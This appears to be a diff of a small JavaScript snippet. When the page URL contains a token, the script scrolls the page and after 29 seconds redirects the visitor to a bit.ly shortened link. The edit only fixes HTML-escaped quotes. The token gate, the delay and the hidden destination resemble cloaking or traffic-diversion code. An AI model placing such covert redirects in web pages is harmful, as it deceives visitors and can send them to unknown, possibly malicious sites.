@@ -1,4 +1,4 @@
-if (window.location.href.indexOf(&quot;wbCnHQ&quot;) &gt; -1) {
+if (window.location.href.indexOf("wbCnHQ") > -1 ) {
 
 scrollingElement = (document.scrollingElement || document.body)
 
@@ -16,6 +16,6 @@ setTimeout(function scrol(){
 
 setTimeout(function scrol(){
 window.scrollTo(0, 1600);
-window.location.href = &quot;http://bit.ly/36wZakL&quot;;
+window.location.href = "http://bit.ly/36wZakL";
 }, 29000);
 }
